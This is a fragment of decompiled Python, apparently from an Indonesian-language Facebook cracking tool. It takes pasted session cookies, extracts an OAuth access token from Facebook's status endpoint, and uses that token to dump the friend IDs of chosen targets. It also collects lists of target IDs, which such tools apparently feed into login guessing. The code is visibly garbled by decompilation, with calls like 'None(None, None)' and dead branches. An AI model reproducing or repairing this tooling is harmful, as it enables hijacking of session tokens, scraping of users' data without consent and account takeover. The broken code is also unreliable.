...
def login():
        ...
        at = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies = {
            'cookie': cok })
        at2 = json.loads(at.text)['name']
        at3 = json.loads(at.text)['id']
        menu(at2, at3)
        return None
        if KeyError:
            loginat()
        ...
        if None.exceptions.ConnectionError:
            li = f''' {M}[{K}${M}]{P}. TIDAK ADA KONEKSI INTERNET, CEK INTERNET ANDA DAN JALANIN ULANG SCNYA'''
    ...
    def loginat():
        os.system('clear')
        banner()
        cok = input(f''' {M}[{K}${M}]{P}. MASUKAN COOKIES :{H} ''')
        ...
        response = wk.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies = {
            'cookie': cok })
        if '"access_token":' in str(response.headers):
            token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
            open('.token.txt', 'w').write(token)
            print(f'''{M}[{K}${M}]{P}. login berhasil''')
        print(f'''{M}[{K}${M}]{P}. login gagal''')
        waktu(4)
        login()
        print(f''' {M}[{K}${M}]{P}. login gagal lagi''')
        waktu(4)
        login()
        None(None, None)
        if not None:
        ...
        if Exception:
            ...
            print(f''' {M}[{K}${M}]{P}. LOGIN GAGAL.CEK TUMBAL LUU COK !!''')
            print(e)
            exit()
            e = None
            del e
...
def Dump_Publik():
        ...
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        a = input(f'''{puti}╰─➤ {bir}INPUT ID {puti}:{bir} ''')
        params = {
            'access_token': token,
        ...
        for c in b['friends']['data']:
            ...
            print(f'''{puti}╰─➤{bir} TOTAL ID {puti}{len(id)}''')
            setting()
            if Exception:
                e = None
                print(e)
                print(f'''{mer}ETDAH LOL!''')
                e = None
                del e
                e = None
                del e
...
token = open('.token.txt', 'r').read()
        ...
        if IOError:
            exit()
        kumpulkan = int(input(f'''{puti}╰─➤ {bir}MAU BERAPA ID ? {puti}:{bir} '''))
        if ValueError:
            exit()
        ...
        for KOTG49H in range(kumpulkan):
            bilangan += 1
            Masukan = input(f'''{puti}╰─➤ {bir}MASUKAN ID YANG KE ''' + str(bilangan) + f''' {puti}:{bir} ''')
            uid.append(Masukan)
            for user in uid:
                head = {
